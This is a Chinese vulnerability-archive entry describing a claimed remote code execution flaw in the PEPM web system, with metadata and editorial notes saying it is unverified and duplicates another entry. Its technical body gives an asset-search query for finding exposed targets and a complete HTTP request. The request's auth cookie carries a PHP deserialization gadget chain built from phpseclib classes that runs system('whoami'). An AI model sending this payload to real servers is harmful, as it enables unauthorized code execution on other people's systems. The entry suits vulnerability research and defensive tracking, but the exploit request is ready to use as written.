---
source: "wy876 漏洞文库"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
title: "PEPM系统Cookie请求头存在远程代码执行漏洞"
product: "PEPM Web系统"
record_type: "vulnerability"
document_type: "Cookie反序列化请求简报"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
prerequisites: "版本仅PEPM；auth Cookie携带phpseclib SSH1/AES/TripleDES链"
side_effects: "原文技术操作的实际副作用未复现核验；按其请求/代码评估状态变更、凭据暴露和业务影响"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E6%A1%8C%E9%9D%A2%E8%BD%AF%E4%BB%B6/PEPM/PEPM%E7%B3%BB%E7%BB%9FCookie%E8%AF%B7%E6%B1%82%E5%A4%B4%E5%AD%98%E5%9C%A8%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md"
archive_commit: "41940cb0038d09ca5aaddbe5bffb923e423d210f"
source_status: "recorded"
source_note: "正文标注的原文链接；链接内容及权威性未在本次重新核验"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/tqiapo8b4781kprv"
id: "vw-e4549c7c66b96db3bc965dc6"
entity_id: "ve-e4549c7c66b96db3bc965dc6"
schema_version: "1"
---

# PEPM系统Cookie请求头存在远程代码执行漏洞

<!-- vulwiki-editorial-rebuild:system-misc -->
## 条目范围与校订

- 本文对象：PEPM Web系统
- 文献类型：Cookie反序列化请求简报
- 版本、权限及部署边界：版本仅PEPM；auth Cookie携带phpseclib SSH1/AES/TripleDES链
- 核验状态：仅重建文本校订；未执行文中代码、PoC 或扫描，未把截图或转载声明记为本站复现

### 具体结论与待核项

以下为原归档的逐项勘误与证据缺口；可由文本确定的问题已在下文订正，仍缺来源的事实保持待核。

1. 与XVE-2024-16919篇载荷相同，无独立漏洞证据；本篇语雀原文链接可补主文来源
2. 简介只重复标题、影响无版本，缺修复建议和响应/执行结果
3. 空Host需替换，序列化长度/依赖版本不可任意修改；无鉴权字段不等已证未认证
4. 应归Web PEPM而非桌面，保留来源差异后不重复收录PoC

### 操作风险

原文技术操作的实际副作用未复现核验；按其请求/代码评估状态变更、凭据暴露和业务影响

技术请求、代码与实验方法按原文保留；其中的破坏性动作仅限授权、可恢复的隔离环境。缺失代码、参数或版本事实不猜补。

### 来源追溯

- 原文标注出处：<https://www.yuque.com/xiaokp7/ocvun2/tqiapo8b4781kprv>
- 原文参考链接（未重新核验）：<https://github.com/wy876/POC>

### 归档技术正文

# 一、漏洞简介
PEPM系统Cookie请求头存在远程代码执行漏洞

# 二、影响版本
+ PEPM

# 三、资产测绘
```plain
header="pepm"
```


# 四、漏洞复现
```plain
GET / HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0
Cookie: auth=a%3A1%3A%7Bi%3A0%3BO%3A18%3A%22phpseclib%5CNet%5CSSH1%22%3A2%3A%7Bs%3A6%3A%22bitmap%22%3Bi%3A1%3Bs%3A6%3A%22crypto%22%3BO%3A19%3A%22phpseclib%5CCrypt%5CAES%22%3A8%3A%7Bs%3A6%3A%22bitmap%22%3Bi%3A1%3Bs%3A6%3A%22crypto%22%3Bi%3A1%3Bs%3A10%3A%22block_size%22%3BN%3Bs%3A12%3A%22inline_crypt%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A25%3A%22phpseclib%5CCrypt%5CTripleDES%22%3A6%3A%7Bs%3A10%3A%22block_size%22%3Bs%3A45%3A%221%29%7B%7D%7D%7D%3B%20ob_clean%28%29%3Bsystem%28%27whoami%27%29%3Bdie%28%29%3B%20%3F%3E%22%3Bs%3A12%3A%22inline_crypt%22%3BN%3Bs%3A16%3A%22use_inline_crypt%22%3Bi%3A1%3Bs%3A7%3A%22changed%22%3Bi%3A0%3Bs%3A6%3A%22engine%22%3Bi%3A1%3Bs%3A4%3A%22mode%22%3Bi%3A1%3B%7Di%3A1%3Bs%3A26%3A%22_createInlineCryptFunction%22%3B%7Ds%3A16%3A%22use_inline_crypt%22%3Bi%3A1%3Bs%3A7%3A%22changed%22%3Bi%3A0%3Bs%3A6%3A%22engine%22%3Bi%3A1%3Bs%3A4%3A%22mode%22%3Bi%3A1%3B%7D%7D%7D
Connection: close
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/tqiapo8b4781kprv>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
